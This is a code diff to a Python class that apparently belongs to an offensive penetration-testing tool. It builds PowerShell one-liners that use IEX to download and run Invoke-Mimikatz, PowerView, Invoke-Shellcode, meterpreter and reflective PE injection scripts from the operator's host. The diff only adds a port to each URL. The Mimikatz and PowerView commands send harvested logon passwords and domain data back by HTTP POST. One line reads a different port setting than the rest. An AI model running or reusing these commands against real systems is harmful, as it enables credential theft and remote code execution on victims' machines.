@@ -32,9 +32,9 @@ class PowerShell:
     def mimikatz(self, command='privilege::debug sekurlsa::logonpasswords exit'):
 
         command = """
-        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/Invoke-Mimikatz.ps1');
+        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Invoke-Mimikatz.ps1');
         $creds = Invoke-{func_name} -Command '{katz_command}';
-        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}/');
+        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}:{port}/');
         $request.Method = 'POST';
         $request.ContentType = 'application/x-www-form-urlencoded';
         $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
@@ -42,8 +42,9 @@ class PowerShell:
         $requestStream = $request.GetRequestStream();
         $requestStream.Write( $bytes, 0, $bytes.Length );
         $requestStream.Close();
-        $request.GetResponse();""".format(protocol=self.protocol, 
-                                          func_name=self.func_name, 
+        $request.GetResponse();""".format(protocol=self.protocol,
+                                          port=settings.args.server_port,
+                                          func_name=self.func_name,
                                           addr=self.localip,
                                           katz_command=command)
 
@@ -52,9 +53,9 @@ class PowerShell:
     def powerview(self, command):
 
         command = """
-        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/powerview.ps1');
+        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/powerview.ps1');
         $output = {view_command} | Out-String;
-        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}/');
+        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}:{port}/');
         $request.Method = 'POST';
         $request.ContentType = 'application/x-www-form-urlencoded';
         $bytes = [System.Text.Encoding]::ASCII.GetBytes($output);
@@ -62,7 +63,8 @@ class PowerShell:
         $requestStream = $request.GetRequestStream();
         $requestStream.Write( $bytes, 0, $bytes.Length );
         $requestStream.Close();
-        $request.GetResponse();""".format(protocol=self.protocol, 
+        $request.GetResponse();""".format(protocol=self.protocol,
+                                          port=settings.args.port,
                                           addr=self.localip,
                                           view_command=command)
 
@@ -70,12 +72,13 @@ class PowerShell:
 
     def inject_meterpreter(self):
         command = """
-        IEX (New-Object Net.WebClient).DownloadString('{0}://{1}/Invoke-Shellcode.ps1');
-        Invoke-{2} -Force -Payload windows/meterpreter/{3} -Lhost {4} -Lport {5}""".format(self.protocol,
+        IEX (New-Object Net.WebClient).DownloadString('{0}://{1}:{2}/Invoke-Shellcode.ps1');
+        Invoke-{3} -Force -Payload windows/meterpreter/{4} -Lhost {5} -Lport {6}""".format(self.protocol,
+                                                                                           settings.args.server_port,
                                                                                            self.localip,
                                                                                            self.func_name,
-                                                                                           settings.args.inject[4:], 
-                                                                                           settings.args.met_options[0], 
+                                                                                           settings.args.inject[4:],
+                                                                                           settings.args.met_options[0],
                                                                                            settings.args.met_options[1])
         if settings.args.procid:
             command += " -ProcessID {}".format(settings.args.procid)
@@ -86,10 +89,11 @@ class PowerShell:
 
     def inject_shellcode(self):
         command = """
-        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/Invoke-Shellcode.ps1');
+        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Invoke-Shellcode.ps1');
         $WebClient = New-Object System.Net.WebClient;
-        [Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}/{shellcode}');
+        [Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}:{port}/{shellcode}');
         Invoke-{func_name} -Force -Shellcode $bytes""".format(protocol=self.protocol,
+                                                              port=settings.args.server_port,
                                                               func_name=self.func_name,
                                                               addr=self.localip,
                                                               shellcode=settings.args.path.split('/')[-1])
@@ -103,11 +107,12 @@ class PowerShell:
 
     def inject_exe_dll(self):
         command = """
-        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/Invoke-ReflectivePEInjection.ps1');
-        Invoke-{func_name} -PEUrl {protocol}://{addr}/{pefile}""".format(protocol=self.protocol,
-                                                                              func_name=self.func_name,
-                                                                              addr=self.localip,
-                                                                              pefile=settings.args.path.split('/')[-1])
+        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Invoke-ReflectivePEInjection.ps1');
+        Invoke-{func_name} -PEUrl {protocol}://{addr}:{port}/{pefile}""".format(protocol=self.protocol,
+                                                                                port=settings.args.server_port,
+                                                                                func_name=self.func_name,
+                                                                                addr=self.localip,
+                                                                                pefile=settings.args.path.split('/')[-1])
 
         if settings.args.procid:
             command += " -ProcID {}"
